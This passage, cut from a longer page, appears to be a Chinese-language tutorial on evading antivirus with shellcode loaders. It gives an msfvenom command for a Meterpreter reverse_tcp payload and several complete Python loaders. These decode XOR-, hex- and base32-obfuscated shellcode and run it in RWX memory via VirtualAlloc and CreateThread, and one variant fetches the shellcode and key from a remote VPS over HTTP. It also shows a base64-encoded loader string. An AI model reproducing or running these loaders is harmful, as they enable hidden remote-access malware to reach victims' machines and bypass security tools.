    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b16decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b32decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="c1"># 返回shellcode</span>
    <span class="k">return</span> <span class="n">shellcode</span>

<span class="k">def</span> <span class="nf">runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="c1"># 加载shellcode</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span> 
    <span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
    <span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="c1"># 混淆的shellcode</span>
    <span class="n">code</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="c1"># 随机数key</span>
    <span class="n">key</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;B4s81a&#39;</span>
    <span class="c1"># 解码</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
    <span class="n">runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</code></pre></div>

<p><a name="MegjA"></a></p>
<h2>shellcode 偏移量混淆</h2>
<blockquote>
<p>思路：通过读取一个shellcode.bin文件的内容，然后将其进行hex编码，因为hex编码是0到9和字母a~f表示的。 所以可以通过遍历hex编码后的shellcode来找到<code>'0123456789abcdef'</code>对应的下标值，然后生成一个偏移量列表。</p>
</blockquote>
<p>1、准备一个shellcode.bin文件</p>
<div class="highlight"><pre><span></span><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.2.128 lport=8080 -f raw -o shellcode.bin
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459183093_3.png"><br />2、python2  / python3 混淆代码：</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">version_info</span>

<span class="c1"># 生成个随机字符，该字符包含0-f即可</span>
<span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdef&#39;</span>

<span class="c1"># 将列表中的元素打乱顺序</span>
<span class="n">key_list</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
<span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">key_list</span><span class="p">)</span>
<span class="n">new_key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">key_list</span><span class="p">)</span>

<span class="c1"># 读取bin内容，并且做hex编码</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;shellcode.bin&#39;</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>

<span class="n">shellcode_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">shellcode</span><span class="p">:</span>
    <span class="c1"># 返回索引值</span>
    <span class="n">value</span> <span class="o">=</span> <span class="n">new_key</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="n">shellcode_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;key: &quot;</span> <span class="o">+</span> <span class="n">new_key</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;shellcode: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">shellcode_list</span><span class="p">))</span>
</code></pre></div>

<p>3、python2 / python3 加载代码:</p>
<div class="highlight"><pre><span></span><code><span class="c1"># -*- coding: UTF-8 -*-</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">version_info</span>

<span class="c1"># 随机数key</span>
<span class="n">key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="c1"># 偏移量列表</span>
<span class="n">shellcod_list</span> <span class="o">=</span> <span class="p">[]</span>
<span class="c1"># 还原shellcode</span>
<span class="n">buf</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">shellcod_list</span><span class="p">:</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>

<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span><span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span>
<span class="n">ptr</span><span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span>
<span class="n">buf</span><span class="o">=</span> <span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_char</span> <span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">.</span><span class="n">from_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
<span class="n">handle</span><span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">ptr</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">pointer</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="n">handle</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
</code></pre></div>

<p><a name="uBlU6"></a></p>
<h2>shellcode 远程/本地加载</h2>
<blockquote>
<p>思路：把编码或加密后的shellcode保存到VPS上，然后用远程方式进行加载。</p>
</blockquote>
<p>1、用前面的方法先将shellcode混淆，然后将生成的 shellcode 和 key 分别保存放到VPS上，最后用python开个web服务。</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">version_info</span>
<span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>


<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="c1"># 设置随机数</span>
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="c1"># 异或解密</span>
    <span class="n">xor_code</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">res_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xor_code</span><span class="p">:</span>
        <span class="n">res_code</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">res_code</span><span class="si">}{</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">255</span><span class="p">))</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="c1"># 三重解码</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">res_code</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">res_code</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b16decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b32decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">shellcode</span>


<span class="k">def</span> <span class="nf">runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span> 
    <span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
    <span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;远程获取shellcode&quot;&quot;&quot;</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="kn">from</span> <span class="nn">urllib2</span> <span class="kn">import</span> <span class="n">urlopen</span>
    <span class="c1"># 远程加载shellcode, key</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_key</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">url_shellcode</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/shellcode.txt&quot;</span>
    <span class="n">url_key</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/key.txt&quot;</span>
    <span class="c1"># 远程加载</span>
    <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span> <span class="o">=</span> <span class="n">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">)</span>
    <span class="c1"># 解码</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
    <span class="c1"># 加载shellcode</span>
    <span class="n">runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459183343_4.png"><br />2、python3 加载器：</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">version_info</span>
<span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
    <span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>
<span class="k">else</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">urllib2</span> <span class="kn">import</span> <span class="n">urlopen</span>


<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="c1"># 设置随机数</span>
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="c1"># 异或解密</span>
    <span class="n">xor_code</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">res_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xor_code</span><span class="p">:</span>
        <span class="n">res_code</span> <span class="o">=</span> <span class="n">res_code</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">255</span><span class="p">))</span>
    <span class="c1"># 三重解码</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">res_code</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">res_code</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b16decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b32decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">shellcode</span>


<span class="k">def</span> <span class="nf">runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span> 
    <span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
    <span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">version_info</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">):</span>
        <span class="kn">from</span> <span class="nn">urllib.request</span> <span class="kn">import</span> <span class="n">urlopen</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="kn">from</span> <span class="nn">urllib2</span> <span class="kn">import</span> <span class="n">urlopen</span>
    <span class="c1"># 远程加载shellcode, key</span>
    <span class="n">key</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_key</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">urlopen</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">url_shellcode</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/shellcode.txt&quot;</span>
    <span class="n">url_key</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.2.131/key.txt&quot;</span>
    <span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span> <span class="o">=</span> <span class="n">get_data</span><span class="p">(</span><span class="n">url_shellcode</span><span class="p">,</span> <span class="n">url_key</span><span class="p">)</span>
    <span class="c1"># 解码</span>
    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
    <span class="c1"># 加载shellcode</span>
    <span class="n">runcode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</code></pre></div>

<p><a name="YfnJL"></a></p>
<h2>loader 代码混淆</h2>
<blockquote>
<p>思路：在对shellcode进行混淆的基础上，现在也尝试对loader模块混淆吧。随意采用你喜欢的混淆方法，这里简单采用base64编码。</p>
</blockquote>
<p>1、简单对下面的代码做个base64编码：</p>
<div class="highlight"><pre><span></span><code><span class="nx">ctypes</span><span class="p">.</span><span class="nx">windll</span><span class="p">.</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">VirtualAlloc</span><span class="p">.</span><span class="nx">restype</span><span class="p">=</span><span class="nx">ctypes</span><span class="p">.</span><span class="nx">c_uint64</span><span class="p">;</span><span class="nx">rwxpage</span><span class="p">=</span><span class="nx">ctypes</span><span class="p">.</span><span class="nx">windll</span><span class="p">.</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nx">len</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">),</span><span class="w"> </span><span class="mh">0x1</span><span class="mi">000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4</span><span class="mi">0</span><span class="p">);</span><span class="nx">ctypes</span><span class="p">.</span><span class="nx">windll</span><span class="p">.</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">RtlMoveMemory</span><span class="p">(</span><span class="nx">ctypes</span><span class="p">.</span><span class="nx">c_uint64</span><span class="p">(</span><span class="nx">rwxpage</span><span class="p">),</span><span class="w"> </span><span class="nx">ctypes</span><span class="p">.</span><span class="nx">create_string_buffer</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">),</span><span class="w"> </span><span class="nx">len</span><span class="p">(</span><span class="nx">shellcode</span><span class="p">));</span><span class="nx">handle</span><span class="p">=</span><span class="nx">ctypes</span><span class="p">.</span><span class="nx">windll</span><span class="p">.</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nx">ctypes</span><span class="p">.</span><span class="nx">c_uint64</span><span class="p">(</span><span class="nx">rwxpage</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="nx">ctypes</span><span class="p">.</span><span class="nx">windll</span><span class="p">.</span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">WaitForSingleObject</span><span class="p">(</span><span class="nx">handle</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div>

<p>2、在线编码<br /><img alt="image.png" src="images/1681459181714/1681459183522_5.png"></p>
<div class="highlight"><pre><span></span><code>Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZT1jdHlwZXMuY191aW50NjQ7cnd4cGFnZT1jdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYygwLCBsZW4oc2hlbGxjb2RlKSwgMHgxMDAwLCAweDQwKTtjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoY3R5cGVzLmNfdWludDY0KHJ3eHBhZ2UpLCBjdHlwZXMuY3JlYXRlX3N0cmluZ19idWZmZXIoc2hlbGxjb2RlKSwgbGVuKHNoZWxsY29kZSkpO2hhbmRsZT1jdHlwZXMud2luZGxsLmtlcm5lbDMyLkNyZWF0ZVRocmVhZCgwLCAwLCBjdHlwZXMuY191aW50NjQocnd4cGFnZSksIDAsIDAsIDApO2N0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChoYW5kbGUsIC0xKQ==
